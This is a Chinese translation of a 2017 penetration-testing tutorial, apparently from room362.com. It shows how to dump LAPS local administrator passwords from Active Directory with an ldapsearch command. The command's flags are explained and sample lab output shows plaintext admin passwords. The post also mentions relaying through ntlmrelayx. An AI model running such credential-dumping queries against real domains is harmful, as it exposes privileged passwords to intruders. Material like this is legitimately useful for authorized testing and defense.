# 【技术分享】如何使用ldapsearch来dump域中的LAPS密码

阅读量 **189981**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2017-07-27 15:33:54

 **x**

##### 译文声明

本文是翻译文章，文章来源：room362.com

原文地址：<https://room362.com/post/2017/dump-laps-passwords-with-ldapsearch/>

译文仅供参考，具体内容表达以及含义原文为准。

****

译者：[for_while](http://bobao.360.cn/member/contribute?uid=2553709124)

预估稿费：50 RMB

投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿

**  
**

**前言**

如果你曾经对使用LAPS的组织做过渗透测试，你应该知道在安全方面使用随机本地管理员密码（LAPS）是最佳的解决方案。

  

**使用ldapsearch来dump域中的LAPS密码**

LAPS将其信息存储在Active Directory中：

到期时间： ms-Mcs-AdmPwdExpirationTime: 131461867015760024

明文存储的密码： ms-Mcs-AdmPwd: %v!e#7S#{s})+y2yS#(

在LAPS首次出现时，Active Directory中的任何用户都可以读取它。不过Microsoft现在已经修复了这个漏洞，您 **现在必须拥有All
extended rights对象的权限或Active Directory的完全控制权，才能执行此操作。**

感谢[Meatballs](https://github.com/Meatballs1)，提供了一个Metasploit模块：[enum_laps.rb](https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/gather/credentials/enum_laps.rb)。但是，不幸的是，在渗透测试的过程中我们并不总能使用
Meterpreter 会话来运行该模块。不过使用ldapsearch（包含在ldapscripts Debian/Ubuntu
中的软件包中）也能实现和上述模块相同的查询。一下为一个运行示例：

    
    
    ldapsearch -x -h 192.168.80.10 -D 
    "helpdesk" -w ASDqwe123 -b "dc=sittingduck,dc=info" 
    "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd

下面解释下这条命令

让我们打破这个：

-x – 使用基本身份验证

-h 192.168.80.10 – 连接到ldap的域控制器

-D "helpdesk" -w ASDqwe123- 以helpdesk（用户名），ASDqwe123（密码）登录

-b "dc=sittingduck,dc=info" – 这将加载整个域的基本LDAP对象。

"(ms-MCS-AdmPwd=*)"- 过滤掉我不能查看ms-MCS-AdmPwd的值的对象。（如果你拥有查看该管理员密码的用户权限，则会显示该密码。）

ms-MCS-AdmPwd- 只显示ms-MCS-AdmPwd对象（默认情况下包含对象名称和DN，以便您知道它所属的主机）

命令执行示例：

    
    
    $ ldapsearch -x -h 192.168.80.10 -D "helpdesk" -w ASDqwe123 -b "dc=sittingduck,dc=info" "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd
    # extended LDIF
    #
    # LDAPv3
    # base <dc=sittingduck,dc=info> with scope subtree
    # filter: (ms-MCS-AdmPwd=*)
    # requesting: ms-MCS-AdmPwd
    #
    # DC1, Domain Controllers, sittingduck.info
    dn: CN=DC1,OU=Domain Controllers,DC=sittingduck,DC=info
    ms-Mcs-AdmPwd: 2F1i/++N0H+G]{Y&,F
    # SDCLIENT_DAWIN7, LabComputers, Lab, sittingduck.info
    dn: CN=SDCLIENT_DAWIN7,OU=LabComputers,OU=Lab,DC=sittingduck,DC=info
    ms-Mcs-AdmPwd: 8CDR4,2UE8BA{zw2@RR
    # SD_WSUS_2012, LabComputers, Lab, sittingduck.info
    dn: CN=SD_WSUS_2012,OU=LabComputers,OU=Lab,DC=sittingduck,DC=info
    ms-Mcs-AdmPwd: +3!UY5@g9B.64RV2z/T
    # WIN-PM0ID6F0AHN, LabComputers, Lab, sittingduck.info
    dn: CN=WIN-PM0ID6F0AHN,OU=LabComputers,OU=Lab,DC=sittingduck,DC=info
    ms-Mcs-AdmPwd: %v!e#7S#{s})+y2yS#(
    # search reference
    ref: ldap://research.sittingduck.info/DC=research,DC=sittingduck,DC=info
    # search reference
    ref: ldap://ForestDnsZones.sittingduck.info/DC=ForestDnsZones,DC=sittingduck,D
     C=info
    # search reference
    ref: ldap://DomainDnsZones.sittingduck.info/DC=DomainDnsZones,DC=sittingduck,D
     C=info
    # search reference
    ref: ldap://sittingduck.info/CN=Configuration,DC=sittingduck,DC=info
    # search result
    search: 2
    result: 0 Success

现在，仅仅只有本地admin密码并不能确定LDPS就开启了，然而你还是可以执行一些后续的操作。

  

**后记**

你可以使用Kerberos进行身份验证（即： Golden/Silver 票据）

因为Windows没有（据我所知）限制只能在域控上登录LDAP连接（可能在未来推出），使用一点编码技术可以让[ntlmrelayx](https://github.com/CoreSecurity/impacket/blob/master/examples/ntlmrelayx.py)
dump LAPS密码。

本文翻译自room362.com [原文链接](https://room362.com/post/2017/dump-laps-passwords-with-ldapsearch/)。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **for_while** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/86502](/post/id/86502)

安全客 - 有思想的安全新媒体

本文转载自: [room362.com](https://room362.com/post/2017/dump-laps-passwords-with-ldapsearch/)

如若转载,请注明出处： <https://room362.com/post/2017/dump-laps-passwords-with-ldapsearch/>

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [安全知识](/tag/安全知识)

 **+1** __0赞

 __收藏

![](https://p1.ssl.qhmsg.com/dm/200_200_100/t011d66e4d0ee6ef2b8.jpg) for_while

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

